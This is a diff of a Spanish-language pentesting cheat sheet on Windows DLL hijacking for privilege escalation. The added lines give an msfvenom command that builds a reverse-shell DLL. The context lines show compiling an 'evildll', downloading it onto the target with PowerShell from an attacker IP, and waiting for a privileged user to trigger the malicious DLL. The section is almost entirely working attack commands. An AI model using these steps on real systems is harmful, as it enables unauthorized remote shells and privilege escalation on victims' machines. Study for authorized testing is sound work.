@@ -1656,6 +1656,12 @@ LPVOID lpReserved ) // Reservado
 x86_64-w64-mingw32-gcc evildll.cpp --shared -o evildll.dll
 ```
 
+###### Alternativa - Usar msfvenom para crear una DLL y recibir una reverse shell
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evildll.dll
+```
+
 ###### Transferimos la DLL a la máquina objetivo
 
 ```powershell
@@ -1663,6 +1669,8 @@ iwr -uri http://192.168.56.5/evildll.dll -OutFile 'C:\Ruta\Al\Binario\<FILE>.dll
 ```
 
 > Tener en cuenta, que si ejecutamos el binario con los privilegios de un usuario normal, el binario será ejecutado con esos privilegios y no es lo que queremos. Con esto en mente, no tenemos que iniciar la aplicación por nuestra cuenta. Deberemos esperar a que alguien con mayores privilegios la ejecute y active la carga de nuestra DLL maliciosa.
+
+
 
 ###  9.2. <a name='linux-2'></a>Linux
 
